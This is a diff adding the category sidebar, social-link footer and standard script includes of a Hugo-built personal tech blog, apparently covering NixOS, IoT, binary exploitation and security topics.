+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/projects/">projects</a>
+                <span style="float:right;">5</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/en-nixos/">en-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/fr-nixos/">fr-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/exploitation-binaire/">exploitation-binaire</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/iot/">iot</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/machine-learning/">machine-learning</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/archlinux/">archlinux</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hacking/">hacking</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/android/">android</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/project/">project</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/raspberry/">raspberry</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/s%C3%A9curit%C3%A9/">sécurité</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  
+  <section id="footer">
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+    <p class="copyright">
+      
+        &copy; 2021
+        
+          AlrikRr-Blog
+        
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+    
+
+    
+      
+    
+
+    
+      
+      
+      
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
+        
+        
+        
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
+        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
+      
+    
+    
+    
+      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
+      <script src="/js/util.js"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/backToTop.js"></script>
+    
+
+    
+      
+        
+      
+    
+
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+      <script src="//yihui.name/js/math-code.js"></script>
+<script async
+src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+  </body>
+</html>
+
